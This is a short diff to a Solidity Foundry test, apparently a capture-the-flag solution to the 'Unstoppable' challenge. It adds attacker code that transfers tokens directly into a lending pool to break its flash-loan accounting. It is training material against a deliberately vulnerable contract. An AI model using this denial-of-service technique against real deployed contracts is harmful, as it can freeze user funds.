@@ -60,6 +60,15 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        // 1. Deposit tokens into the pool by attacker
+        vm.startPrank(attacker);
+        dvt.approve(address(unstoppableLender), INITIAL_ATTACKER_TOKEN_BALANCE);
+        // 2. Transfer tokens from attacker to pool directly by using transfer function
+        dvt.transfer(address(unstoppableLender), INITIAL_ATTACKER_TOKEN_BALANCE);
+
+        
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
